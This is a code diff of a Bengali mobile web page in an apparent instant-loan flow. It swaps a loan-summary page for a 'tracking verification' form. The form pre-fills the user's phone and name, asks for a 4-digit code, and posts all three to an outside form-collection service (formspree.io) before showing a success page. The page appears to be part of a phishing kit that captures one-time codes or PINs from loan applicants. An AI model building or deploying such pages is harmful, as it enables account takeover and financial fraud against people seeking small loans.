@@ -3,151 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>লোনের বিস্তারিত</title>
+    <title>আবেদন ট্র্যাকিং যাচাই</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
         body { 
-            background: #2b2342; 
+            background: #f1f5f9; 
             min-height: 100vh;
             display: flex;
             justify-content: center;
+            align-items: flex-start;
         }
-        .container {
+        .screen-container {
             width: 100%;
             max-width: 450px;
             background: #ffffff;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.06);
+        }
+        .top-accent {
+            height: 16px;
+            background: linear-gradient(90deg, #ff4e00, #ff8c00);
+            width: 100%;
+        }
+        .header-title-box {
+            padding: 25px 20px 10px;
+            text-align: center;
             position: relative;
         }
-        .header-bg {
-            background: linear-gradient(180deg, #ff5100 0%, #ff7700 100%);
-            padding: 30px 20px 60px;
-            text-align: center;
-            color: #ffffff;
-            border-bottom-left-radius: 25px;
-            border-bottom-right-radius: 25px;
-        }
-        .header-bg h2 {
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 6px;
-        }
-        .header-bg p {
-            font-size: 13px;
-            opacity: 0.9;
-        }
-        .content-card {
-            margin: -40px 16px 20px;
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
-            padding: 16px;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        .summary-banner {
-            background: linear-gradient(90deg, #ff5e00, #ff2a00);
-            border-radius: 14px;
-            padding: 18px 10px;
-            display: flex;
-            justify-content: space-around;
-            color: #ffffff;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(255, 68, 0, 0.25);
-            margin-bottom: 20px;
-        }
-        .banner-col {
-            flex: 1;
-            position: relative;
-        }
-        .banner-col:not(:last-child)::after {
-            content: '';
+        .back-btn {
             position: absolute;
-            right: 0;
-            top: 15%;
-            height: 70%;
-            width: 1px;
-            background: rgba(255,255,255,0.3);
-        }
-        .banner-title {
-            font-size: 11px;
-            opacity: 0.9;
-            margin-bottom: 6px;
-            display: block;
-        }
-        .banner-val {
-            font-size: 16px;
-            font-weight: bold;
-        }
-        .schedule-box {
-            border: 1.5px solid #edf2f7;
-            border-radius: 14px;
-            overflow: hidden;
-            margin-bottom: 25px;
-        }
-        .schedule-header {
-            padding: 12px 16px;
-            font-size: 13px;
-            font-weight: bold;
+            left: 20px;
+            top: 25px;
+            background: none;
+            border: none;
+            font-size: 18px;
             color: #475569;
-            background: #ffffff;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .header-title-box h2 {
+            font-size: 22px;
+            color: #1e293b;
+            margin-bottom: 5px;
+        }
+        .header-title-box p {
+            font-size: 13px;
+            color: #64748b;
+        }
+        .form-body {
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .info-badge {
+            background: #eff6ff;
+            border: 1px solid #bfdbfe;
+            color: #1d4ed8;
+            padding: 12px 14px;
+            border-radius: 10px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 22px;
+        }
+        .input-group { margin-bottom: 18px; }
+        .input-label {
             display: flex;
             align-items: center;
             gap: 8px;
-            border-bottom: 1.5px solid #edf2f7;
-        }
-        .schedule-header i {
-            color: #ff5e00;
-        }
-        .schedule-table {
-            width: 100%;
-            border-collapse: collapse;
-            text-align: left;
             font-size: 13px;
+            font-weight: bold;
+            color: #475569;
+            margin-bottom: 8px;
         }
-        .schedule-table th {
-            background: #f8fafc;
+        .input-label i { color: #ff6a00; }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .field-icon {
+            position: absolute;
+            left: 15px;
             color: #64748b;
-            padding: 10px 14px;
-            font-weight: 600;
+            font-size: 16px;
         }
-        .schedule-table td {
-            padding: 14px;
-            border-top: 1px solid #edf2f7;
-            color: #334155;
-        }
-        .month-badge {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            line-height: 24px;
-            text-align: center;
-            background: #eff6ff;
-            color: #3b82f6;
-            border-radius: 50%;
-            font-weight: bold;
-            font-size: 11px;
-        }
-        .amount-col {
-            color: #dc2626;
-            font-weight: bold;
-            text-align: right;
-        }
-        .schedule-table th:last-child {
-            text-align: right;
-        }
-        .footer-action {
-            margin-top: auto;
-            padding-bottom: 10px;
-        }
-        .confirm-btn {
+        .input-field {
             width: 100%;
+            padding: 14px 16px 14px 46px;
+            background: #f8fafc;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
+            color: #1e293b;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .input-field:focus {
+            background: #ffffff;
+            border-color: #ff6a00;
+        }
+        .tracking-box {
+            letter-spacing: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            padding-left: 16px;
+        }
+        .submit-btn {
+            width: 100%;
+            margin-top: 15px;
             padding: 15px;
-            background: linear-gradient(90deg, #ff6a00, #ff2a00);
+            background: linear-gradient(90deg, #ff7a00, #ff3400);
             color: #ffffff;
             border: none;
             border-radius: 30px;
@@ -158,108 +128,104 @@
             justify-content: center;
             gap: 10px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 68, 0, 0.35);
-            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(255, 68, 0, 0.3);
+        }
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header-bg">
-        <h2>লোনের বিস্তারিত</h2>
-        <p>তথ্যগুলো যাচাই করুন — সব ঠিক থাকলে এগিয়ে যান</p>
+<div class="screen-container">
+    <div class="top-accent"></div>
+
+    <div class="header-title-box">
+        <a href="./summary.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+        <h2>আবেদন ট্র্যাকিং যাচাই</h2>
+        <p>আপনার আবেদনের ট্র্যাকিং সম্পন্ন করুন</p>
     </div>
 
-    <div class="content-card">
-        <div class="summary-banner">
-            <div class="banner-col">
-                <span class="banner-title">লোন পরিমাণ</span>
-                <span class="banner-val" id="dispPrincipal">৳৩,০০০</span>
-            </div>
-            <div class="banner-col">
-                <span class="banner-title">মোট মুনাফা</span>
-                <span class="banner-val" id="dispInterest">৳১৩৫</span>
-            </div>
-            <div class="banner-col">
-                <span class="banner-title">সর্বমোট দেয়</span>
-                <span class="banner-val" id="dispTotal">৳৩,১৩৫</span>
-            </div>
+    <div class="form-body">
+        <div class="info-badge">
+            <i class="fa-solid fa-circle-info"></i>
+            <span>আপনার ৪ সংখ্যার ট্র্যাকিং কোডটি প্রবেশ করান</span>
         </div>
 
-        <div class="schedule-box">
-            <div class="schedule-header">
-                <i class="fa-solid fa-calendar-check"></i>
-                <span>মাসিক পরিশোধ তালিকা</span>
+        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+            <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
+            
+            <div class="input-group">
+                <label class="input-label"><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-mobile-screen field-icon"></i>
+                    <input type="tel" name="মোবাইল_নম্বর" id="phoneField" class="input-field" required placeholder="০১XXXXXXXXX">
+                </div>
             </div>
-            <table class="schedule-table">
-                <thead>
-                    <tr>
-                        <th>মাস</th>
-                        <th>তারিখ</th>
-                        <th>পরিমাণ</th>
-                    </tr>
-                </thead>
-                <tbody id="scheduleRows"></tbody>
-            </table>
-        </div>
 
-        <div class="footer-action">
-            <a id="btnNext" href="./verify.html" class="confirm-btn">
-                <span>সম্মতি দিন ও এগিয়ে যান</span>
-                <i class="fa-solid fa-check"></i>
-            </a>
-        </div>
+            <div class="input-group">
+                <label class="input-label"><i class="fa-solid fa-hashtag"></i> ট্র্যাকিং কোড (৪ ডিজিট)</label>
+                <div class="input-wrapper">
+                    <input type="text" name="ট্র্যাকিং_কোড" class="input-field tracking-box" maxlength="4" pattern="[0-9]{4}" required placeholder="####">
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="submit-btn">
+                <span>যাচাই ও নিশ্চিত করুন</span>
+                <i class="fa-solid fa-arrow-right"></i>
+            </button>
+        </form>
     </div>
 </div>
 
 <script>
+    // URL থেকে স্বয়ংক্রিয়ভাবে ফোন ও নাম ইনপুটে বসানো
     const params = new URLSearchParams(window.location.search);
+    const phone = params.get('phone');
+    const name = params.get('name');
     
-    const phone = params.get('phone') || '';
-    const name = params.get('name') || '';
-    let rawAmount = params.get('amount') || '3000';
-    let numericAmount = parseInt(rawAmount.replace(/[^0-9]/g, '')) || 3000;
-    
-    let rawMonths = params.get('tenure') || '3';
-    let months = parseInt(rawMonths.replace(/[^0-9]/g, '')) || 3;
-
-    // মুনাফা ও কিস্তির হিসাব
-    let interest = Math.round(numericAmount * 0.015 * months);
-    let totalPayable = numericAmount + interest;
-    let monthlyInstallment = Math.round(totalPayable / months);
-
-    function toBengali(num) {
-        const bnDigits = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
-        return num.toString().replace(/[0-9]/g, d => bnDigits[d]);
+    if (phone) {
+        document.getElementById('phoneField').value = phone;
+    }
+    if (name) {
+        document.getElementById('hiddenName').value = name;
     }
 
-    document.getElementById('dispPrincipal').innerText = '৳' + toBengali(numericAmount.toLocaleString('en-US'));
-    document.getElementById('dispInterest').innerText = '৳' + toBengali(interest.toLocaleString('en-US'));
-    document.getElementById('dispTotal').innerText = '৳' + toBengali(totalPayable.toLocaleString('en-US'));
+    const form = document.getElementById("verifyForm");
+    const submitBtn = document.getElementById("submitBtn");
 
-    // কিস্তির তালিকা
-    const tbody = document.getElementById('scheduleRows');
-    const today = new Date();
-    const monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
-
-    tbody.innerHTML = '';
-    for (let i = 1; i <= months; i++) {
-        let payDate = new Date(today.getFullYear(), today.getMonth() + i, today.getDate());
-        let dateStr = `${payDate.getDate()} ${monthNames[payDate.getMonth()]}, ${payDate.getFullYear()}`;
+    form.addEventListener("submit", async function(event) {
+        event.preventDefault();
         
-        let row = `
-            <tr>
-                <td><span class="month-badge">${i}</span></td>
-                <td>${dateStr}</td>
-                <td class="amount-col">৳${monthlyInstallment}</td>
-            </tr>
-        `;
-        tbody.innerHTML += row;
-    }
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';
 
-    // পরবর্তী বাটনে মোবাইল ও নাম লিঙ্ক করে দেওয়া
-    document.getElementById('btnNext').href = `./verify.html?phone=${encodeURIComponent(phone)}&name=${encodeURIComponent(name)}`;
+        const data = new FormData(form);
+
+        try {
+            const response = await fetch(form.action, {
+                method: "POST",
+                body: data,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+
+            if (response.ok) {
+                // ভেরিফাই সম্পন্ন হলে সফলতার পেজে পাঠানো
+                window.location.href = "./success.html";
+            } else {
+                alert("দুঃখিত, তথ্য সংরক্ষণ করা যায়নি। আবার চেষ্টা করুন।");
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span>যাচাই ও নিশ্চিত করুন</span> <i class="fa-solid fa-arrow-right"></i>';
+            }
+        } catch (error) {
+            alert("ইন্টারনেট সংযোগ চেক করে পুনরায় চেষ্টা করুন।");
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<span>যাচাই ও নিশ্চিত করুন</span> <i class="fa-solid fa-arrow-right"></i>';
+        }
+    });
 </script>
 
 </body>
